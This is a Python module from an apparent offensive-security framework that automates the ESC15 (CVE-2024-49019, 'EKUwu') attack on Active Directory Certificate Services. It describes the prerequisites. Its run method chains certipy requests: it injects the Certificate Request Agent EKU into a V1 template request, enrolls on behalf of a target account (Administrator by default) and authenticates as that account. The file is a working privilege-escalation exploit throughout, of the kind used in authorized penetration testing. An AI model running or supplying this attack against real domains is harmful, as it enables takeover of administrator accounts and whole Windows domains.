import os

from tool import Tool
from module import BaseModule

class ADCSESC15(BaseModule):
    name = "ADCS - ESC15"
    path = "adcs/esc15"
    description = "ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 \"EKUwu\")"

    info = """This vulnerability allows an attacker to inject arbitrary Application Policies (EKUs) into a certificate request for a Version 1 (V1) template, which an unpatched Certificate Authority (CA) will incorrectly include in the issued certificate. This bypasses the template's defined EKUs, granting the certificate unintended capabilities. For example, an attacker could enroll in a V1 "WebServer" template and inject the "Client Authentication" EKU, creating a certificate that can be used for domain authentication, leading to privilege escalation.

Prerequisites:
  - The CA server is unpatched for CVE-2024-49019 (pre-November 2024 patches).
  - The attacker has enrollment rights on a vulnerable Version 1 certificate template.
  - The vulnerable V1 template has the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag enabled ("Supply in the request" setting for subject name). This allows the attacker to supply the malicious Application Policies extension in the Certificate Signing Request (CSR)."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "template": {"default": "WebServer", "description": "ESC15 vulnerable template", "required": False},
        "target_account": {"default": "Administrator", "description": "Account to attempt to compromise", "required": False},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return


        pfx = self.uniq_filename(self.opts.target_account)
        pfx2 = self.uniq_filename(self.opts.target_account)

        tool.title("Request a certificate, injecting Certificate Request Agent EKU and target UPN")
        if not await tool.certipy_req(['-template', self.opts.template, '-upn', f"{self.opts.target_account}@{self.opts.domain}", '-application-policies', '1.3.6.1.4.1.311.20.2.1', '-out', pfx]):
            return

        tool.title("Use the obtained certificate to request a User certificate on behalf of the target user")
        if not await tool.certipy_req(['-template', 'User', '-on-behalf-of', self.opts.target_account, '-pfx', pfx, '-out', pfx2]):
            return

        tool.title("Authenticate as the target user")
        if not await tool.certipy_auth(pfx2, ['-no-save']):
            return

        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
